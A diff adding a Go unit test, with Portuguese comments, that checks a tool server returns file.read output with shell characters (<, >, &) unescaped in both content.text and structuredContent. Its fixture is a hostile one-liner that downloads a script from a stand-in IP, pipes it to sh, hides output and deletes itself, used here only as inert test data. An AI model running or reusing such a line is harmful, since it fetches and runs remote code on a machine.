@@ -1154,3 +1154,55 @@ func TestToolComProcedenciaNaoSeDeclaraDoMotor(t *testing.T) {
 		}
 	}
 }
+
+// UM ENCODER SÓ NA RESPOSTA INTEIRA.
+//
+// json.Marshal escapa <, > e & como \u003c, \u003e e \u0026 — herança de quem
+// embute JSON em HTML. O frame já era escrito sem isso, mas o CORPO entrava
+// como RawMessage já escapada, e o encoder de fora não desfaz.
+//
+// Isso importa por dois motivos medidos. Bytes: uma linha de evidência de shell
+// real inflou 27%, e eles saem do mesmo teto de frame que a paginação respeita.
+// Legibilidade: o modelo lê content.text, e ali o escape aparece com DUAS
+// barras — 2\\u003e\\u00261 onde a evidência diz 2>&1. Redirecionamento e
+// encadeamento são exatamente o que se procura numa linha de comando.
+//
+// O caminho medido é file.read porque nele os bytes da resposta são os bytes do
+// arquivo: qualquer outra tool passaria por uma camada que poderia mascarar o
+// que está sob teste.
+func TestRespostaNaoEscapaOsCaracteresDeShell(t *testing.T) {
+	const linhaDeShell = "curl -s http://198.51.100.7/x | sh > /dev/null 2>&1 && rm -f $0"
+
+	s, raiz := servidorDeArquivo(t, true)
+	if err := os.WriteFile(filepath.Join(raiz, "etc", "gatilho.sh"),
+		[]byte(linhaDeShell+"\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	corpo, _, er := s.chamarTool(&Requisicao{
+		Params: json.RawMessage(`{"name":"file.read","arguments":{"path":"/etc/gatilho.sh"}}`)})
+	if er != nil {
+		t.Fatal(er)
+	}
+	linha := string(s.selar(EraModerna, false, corpo))
+
+	for _, escape := range []string{"u003e", "u003c", "u0026"} {
+		if strings.Contains(linha, escape) {
+			t.Errorf("a resposta escapa caractere de shell (%s):\n%s",
+				escape, recorte(linha, 400))
+		}
+	}
+	// E a prova de que o teste não passou por não ter o caractere: a linha
+	// precisa chegar LITERAL, nos dois lugares que a resposta carrega.
+	if strings.Count(linha, "2>&1 && rm -f") != 2 {
+		t.Errorf("a evidência com redirecionamento tinha de chegar literal em "+
+			"content.text E em structuredContent:\n%s", recorte(linha, 900))
+	}
+}
+
+func recorte(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + "…"
+}
